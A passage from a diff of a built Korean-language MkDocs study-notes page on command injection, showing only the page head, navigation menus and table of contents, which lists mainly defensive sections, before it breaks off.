@@ -1,11 +1,2913 @@
-<!doctype html><html lang=ko class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="백엔드 엔지니어 강영규의 기술 노트 — 시스템과 인프라, 그 사이의 모든 것"><meta name=author content=GYUTORY><link href=https://gyutory.github.io/YGSTUDY/Security/Command_Injection/ rel=canonical><link href=../Clickjacking/ rel=prev><link href=../Insecure_Deserialization/ rel=next><link rel=alternate type=application/rss+xml title="RSS 피드 생성완료" href=../../feed_rss_created.xml><link rel=alternate type=application/rss+xml title="RSS 피드 업데이트완료" href=../../feed_rss_updated.xml><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.7.7"><title>Command Injection - YGSTUDY</title><link rel=stylesheet href=../../assets/stylesheets/main.ec1eaa64.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.ab4e12ef.min.css><link rel=stylesheet href=../../stylesheets/extra.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=white data-md-color-accent=blue> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#os-command-injection class=md-skip> 콘텐츠로 이동 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--shadow" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=상단/헤더> <a href=../.. title=YGSTUDY class="md-header__button md-logo" aria-label=YGSTUDY data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m19 2-5 4.5v11l5-4.5zM6.5 5C4.55 5 2.45 5.4 1 6.5v14.66c0 .25.25.5.5.5.1 0 .15-.07.25-.07 1.35-.65 3.3-1.09 4.75-1.09 1.95 0 4.05.4 5.5 1.5 1.35-.85 3.8-1.5 5.5-1.5 1.65 0 3.35.31 4.75 1.06.1.05.15.03.25.03.25 0 .5-.25.5-.5V6.5c-.6-.45-1.25-.75-2-1V19c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5V6.5C10.55 5.4 8.45 5 6.5 5"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> YGSTUDY </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Command Injection </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme=default data-md-color-primary=white data-md-color-accent=blue aria-label="다크 모드로 전환" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="다크 모드로 전환" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue aria-label="라이트 모드로 전환" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="라이트 모드로 전환" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=검색 placeholder=검색 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=검색> <a href=javascript:void(0) class="md-search__icon md-icon" title=공유 aria-label=공유 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg> </a> <button type=reset class="md-search__icon md-icon" title=지우기 aria-label=지우기 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 검색 초기화 </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/gyutory/YGSTUDY title="저장소로 이동" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </div> <div class=md-source__repository> gyutory/YGSTUDY </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=네비게이션 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=YGSTUDY class="md-nav__button md-logo" aria-label=YGSTUDY data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m19 2-5 4.5v11l5-4.5zM6.5 5C4.55 5 2.45 5.4 1 6.5v14.66c0 .25.25.5.5.5.1 0 .15-.07.25-.07 1.35-.65 3.3-1.09 4.75-1.09 1.95 0 4.05.4 5.5 1.5 1.35-.85 3.8-1.5 5.5-1.5 1.65 0 3.35.31 4.75 1.06.1.05.15.03.25.03.25 0 .5-.25.5-.5V6.5c-.6-.45-1.25-.75-2-1V19c-1.1-.35-2.3-.5-3.5-.5-1.7 0-4.15.65-5.5 1.5V6.5C10.55 5.4 8.45 5 6.5 5"/></svg> </a> YGSTUDY </label> <div class=md-nav__source> <a href=https://github.com/gyutory/YGSTUDY title="저장소로 이동" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </div> <div class=md-source__repository> gyutory/YGSTUDY </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> YGSTUDY </span> </a> </li> <li class=md-nav__item> <a href=../../%EC%B5%9C%EA%B7%BC/ class=md-nav__link> <span class=md-ellipsis> 최근 변경 문서 </span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../Language/ class=md-nav__link> <span class=md-ellipsis> Language </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../Framework/ class=md-nav__link> <span class=md-ellipsis> Backend </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../DataBase/ class=md-nav__link> <span class=md-ellipsis> Database </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../Cloud/ class=md-nav__link> <span class=md-ellipsis> Infra </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_7 checked> <label class=md-nav__link for=__nav_7 id=__nav_7_label tabindex=0> <span class=md-ellipsis> CS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_7_label aria-expanded=true> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> CS </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../Network/ class=md-nav__link> <span class=md-ellipsis> Network </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../OS/ class=md-nav__link> <span class=md-ellipsis> OS </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../Algorithm/ class=md-nav__link> <span class=md-ellipsis> Algorithm </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_7_4 checked> <div class="md-nav__link md-nav__container"> <a href=../ class="md-nav__link "> <span class=md-ellipsis> Security </span> </a> <label class="md-nav__link " for=__nav_7_4 id=__nav_7_4_label tabindex=0> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_7_4_label aria-expanded=true> <label class=md-nav__title for=__nav_7_4> <span class="md-nav__icon md-icon"></span> Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../Basic/ class=md-nav__link> <span class=md-ellipsis> 보안 기초 개념 </span> </a> </li> <li class=md-nav__item> <a href=../Threat_Modeling/ class=md-nav__link> <span class=md-ellipsis> 위협 모델링 </span> </a> </li> <li class=md-nav__item> <a href=../OWASP_Top_10/ class=md-nav__link> <span class=md-ellipsis> OWASP Top 10 </span> </a> </li> <li class=md-nav__item> <a href=../%EB%B3%B4%EC%95%88_%EC%8B%AC%ED%99%94_%EB%B0%8F_%EC%B7%A8%EC%95%BD%EC%A0%90_%EB%B6%84%EC%84%9D/ class=md-nav__link> <span class=md-ellipsis> 보안 심화 및 취약점 분석 </span> </a> </li> <li class=md-nav__item> <a href=../Tenant_Key_Management/ class=md-nav__link> <span class=md-ellipsis> 테넌트별 암호화 키 격리 </span> </a> </li> <li class=md-nav__item> <a href=../Cross_Tenant_Leak/ class=md-nav__link> <span class=md-ellipsis> 크로스 테넌트 유출 </span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../API_Security/ class=md-nav__link> <span class=md-ellipsis> API 보안 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../AES/ class=md-nav__link> <span class=md-ellipsis> 암호화 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../HTTPS_and_TLS/ class=md-nav__link> <span class=md-ellipsis> 전송 구간 보안 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../OAuth/ class=md-nav__link> <span class=md-ellipsis> 인증과 세션 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_7_4_12 checked> <label class=md-nav__link for=__nav_7_4_12 id=__nav_7_4_12_label tabindex=0> <span class=md-ellipsis> 웹 취약점 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=3 aria-labelledby=__nav_7_4_12_label aria-expanded=true> <label class=md-nav__title for=__nav_7_4_12> <span class="md-nav__icon md-icon"></span> 웹 취약점 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../XSS/ class=md-nav__link> <span class=md-ellipsis> XSS </span> </a> </li> <li class=md-nav__item> <a href=../CSRF/ class=md-nav__link> <span class=md-ellipsis> CSRF </span> </a> </li> <li class=md-nav__item> <a href=../SSRF/ class=md-nav__link> <span class=md-ellipsis> SSRF </span> </a> </li> <li class=md-nav__item> <a href=../Clickjacking/ class=md-nav__link> <span class=md-ellipsis> Clickjacking </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Command Injection </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Command Injection </span> </a> <nav class="md-nav md-nav--secondary" aria-label=목차> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 목차 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#공격이-성립하는-근본-원인 class=md-nav__link> <span class=md-ellipsis> 공격이 성립하는 근본 원인 </span> </a> </li> <li class=md-nav__item> <a href=#위험한-함수와-안전한-함수 class=md-nav__link> <span class=md-ellipsis> 위험한 함수와 안전한 함수 </span> </a> <nav class=md-nav aria-label="위험한 함수와 안전한 함수"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#nodejs class=md-nav__link> <span class=md-ellipsis> Node.js </span> </a> </li> <li class=md-nav__item> <a href=#python class=md-nav__link> <span class=md-ellipsis> Python </span> </a> </li> <li class=md-nav__item> <a href=#typescript-nodejs class=md-nav__link> <span class=md-ellipsis> TypeScript (Node.js) </span> </a> </li> <li class=md-nav__item> <a href=#php class=md-nav__link> <span class=md-ellipsis> PHP </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#메타문자-페이로드-패턴 class=md-nav__link> <span class=md-ellipsis> 메타문자 페이로드 패턴 </span> </a> </li> <li class=md-nav__item> <a href=#파일-업로드--명령-인젝션-콤보 class=md-nav__link> <span class=md-ellipsis> 파일 업로드 + 명령 인젝션 콤보 </span> </a> </li> <li class=md-nav__item> <a href=#이미지미디어-라이브러리-인자-인젝션 class=md-nav__link> <span class=md-ellipsis> 이미지/미디어 라이브러리 인자 인젝션 </span> </a> <nav class=md-nav aria-label="이미지/미디어 라이브러리 인자 인젝션"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#imagemagick--imagetragick-cve-2016-3714 class=md-nav__link> <span class=md-ellipsis> ImageMagick — ImageTragick (CVE-2016-3714) </span> </a> </li> <li class=md-nav__item> <a href=#ffmpeg-인자-인젝션 class=md-nav__link> <span class=md-ellipsis> ffmpeg 인자 인젝션 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#blind-명령-인젝션-탐지 class=md-nav__link> <span class=md-ellipsis> Blind 명령 인젝션 탐지 </span> </a> <nav class=md-nav aria-label="Blind 명령 인젝션 탐지"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#시간-지연-기반-탐지 class=md-nav__link> <span class=md-ellipsis> 시간 지연 기반 탐지 </span> </a> </li> <li class=md-nav__item> <a href=#out-of-bandoob-콜백 class=md-nav__link> <span class=md-ellipsis> Out-of-Band(OOB) 콜백 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#방어-방법 class=md-nav__link> <span class=md-ellipsis> 방어 방법 </span> </a> <nav class=md-nav aria-label="방어 방법"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#1-셸을-호출하지-않는다 class=md-nav__link> <span class=md-ellipsis> 1. 셸을 호출하지 않는다 </span> </a> </li> <li class=md-nav__item> <a href=#2-외부-명령을-아예-호출하지-않는다 class=md-nav__link> <span class=md-ellipsis> 2. 외부 명령을 아예 호출하지 않는다 </span> </a> </li> <li class=md-nav__item> <a href=#3-인자에-들어갈-값은-allowlist로-제한 class=md-nav__link> <span class=md-ellipsis> 3. 인자에 들어갈 값은 allowlist로 제한 </span> </a> </li> <li class=md-nav__item> <a href=#4-인자-앞에----또는-경로-prefix를-붙인다 class=md-nav__link> <span class=md-ellipsis> 4. 인자 앞에 -- 또는 경로 prefix를 붙인다 </span> </a> </li> <li class=md-nav__item> <a href=#5-최소-권한으로-실행 class=md-nav__link> <span class=md-ellipsis> 5. 최소 권한으로 실행 </span> </a> </li> <li class=md-nav__item> <a href=#6-미디어-라이브러리-정책-강화 class=md-nav__link> <span class=md-ellipsis> 6. 미디어 라이브러리 정책 강화 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#사고-사례에서-배우는-것 class=md-nav__link> <span class=md-ellipsis> 사고 사례에서 배우는 것 </span> </a> </li> <li class=md-nav__item> <a href=#코드-리뷰-시-확인-포인트 class=md-nav__link> <span class=md-ellipsis> 코드 리뷰 시 확인 포인트 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../Insecure_Deserialization/ class=md-nav__link> <span class=md-ellipsis> 안전하지 않은 역직렬화 </span> </a> </li> <li class=md-nav__item> <a href=../XML_External_Entity/ class=md-nav__link> <span class=md-ellipsis> XXE 주입 </span> </a> </li> <li class=md-nav__item> <a href=../Path_Traversal/ class=md-nav__link> <span class=md-ellipsis> Path Traversal </span> </a> </li> <li class=md-nav__item> <a href=../Open_Redirect/ class=md-nav__link> <span class=md-ellipsis> Open Redirect </span> </a> </li> <li class=md-nav__item> <a href=../Open_Redirect_Deep_Dive/ class=md-nav__link> <span class=md-ellipsis> Open Redirect 심화 </span> </a> </li> <li class=md-nav__item> <a href=../Web_Cache_Poisoning/ class=md-nav__link> <span class=md-ellipsis> 웹 캐시 포이즈닝 </span> </a> </li> <li class=md-nav__item> <a href=../CORS_and_Security_Headers/ class=md-nav__link> <span class=md-ellipsis> CORS와 브라우저 보안 헤더 </span> </a> </li> <li class=md-nav__item> <a href=../File_Upload_Security/ class=md-nav__link> <span class=md-ellipsis> 파일 업로드 보안 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../D_Do_S_Defense/ class=md-nav__link> <span class=md-ellipsis> 공격 방어 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../Zero_Trust_Architecture/ class=md-nav__link> <span class=md-ellipsis> 인프라 보안 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../Dev_Sec_Ops/ class=md-nav__link> <span class=md-ellipsis> 운영과 컴플라이언스 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../SQL_%EC%9D%B8%EC%A0%9D%EC%85%98/ class=md-nav__link> <span class=md-ellipsis> SQL Injection </span> <span class="md-nav__icon md-icon"></span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../AI/ class=md-nav__link> <span class=md-ellipsis> AI </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class="md-nav__item md-nav__item--pruned md-nav__item--nested"> <a href=../../_hub/%ED%8A%B8%EB%9E%9C%EC%9E%AD%EC%85%98%EA%B3%BC_%EB%8F%99%EC%8B%9C%EC%84%B1/ class=md-nav__link> <span class=md-ellipsis> 가이드 </span> <span class="md-nav__icon md-icon"></span> </a> </li> <li class=md-nav__item> <a href=../../tags/ class=md-nav__link> <span class=md-ellipsis> Tags </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=목차> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 목차 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#공격이-성립하는-근본-원인 class=md-nav__link> <span class=md-ellipsis> 공격이 성립하는 근본 원인 </span> </a> </li> <li class=md-nav__item> <a href=#위험한-함수와-안전한-함수 class=md-nav__link> <span class=md-ellipsis> 위험한 함수와 안전한 함수 </span> </a> <nav class=md-nav aria-label="위험한 함수와 안전한 함수"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#nodejs class=md-nav__link> <span class=md-ellipsis> Node.js </span> </a> </li> <li class=md-nav__item> <a href=#python class=md-nav__link> <span class=md-ellipsis> Python </span> </a> </li> <li class=md-nav__item> <a href=#typescript-nodejs class=md-nav__link> <span class=md-ellipsis> TypeScript (Node.js) </span> </a> </li> <li class=md-nav__item> <a href=#php class=md-nav__link> <span class=md-ellipsis> PHP </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#메타문자-페이로드-패턴 class=md-nav__link> <span class=md-ellipsis> 메타문자 페이로드 패턴 </span> </a> </li> <li class=md-nav__item> <a href=#파일-업로드--명령-인젝션-콤보 class=md-nav__link> <span class=md-ellipsis> 파일 업로드 + 명령 인젝션 콤보 </span> </a> </li> <li class=md-nav__item> <a href=#이미지미디어-라이브러리-인자-인젝션 class=md-nav__link> <span class=md-ellipsis> 이미지/미디어 